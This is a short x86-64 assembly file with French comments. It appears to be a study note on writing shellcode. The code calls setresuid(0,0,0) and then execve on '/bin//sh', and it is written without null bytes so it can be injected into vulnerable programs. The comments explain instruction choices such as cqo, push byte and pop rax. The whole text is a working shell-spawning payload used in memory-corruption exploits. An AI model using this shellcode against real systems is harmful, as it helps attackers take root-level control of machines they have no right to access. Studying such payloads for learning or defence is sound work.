BITS 64
xor rax, rax
xor rdi, rdi
xor rsi, rsi
cqo; https://www.felixcloutier.com/x86/cwd:cdq:cqo
mov byte al, 0x75; byte peut être omis
syscall

push rdx
mov r8, 0x68732f2f6e69622f
push r8
mov rdi, rsp; utiliser mov au lieu de lea

push rdx
mov rdx, rsp

push rdi; il faut avoir des zéroes avant d'empiler une adresse
lea rsi, [rsp]

push byte +0x3b
pop rax; pop rax est un seul octet, pop ne peut pas être utilisé avec al 
syscall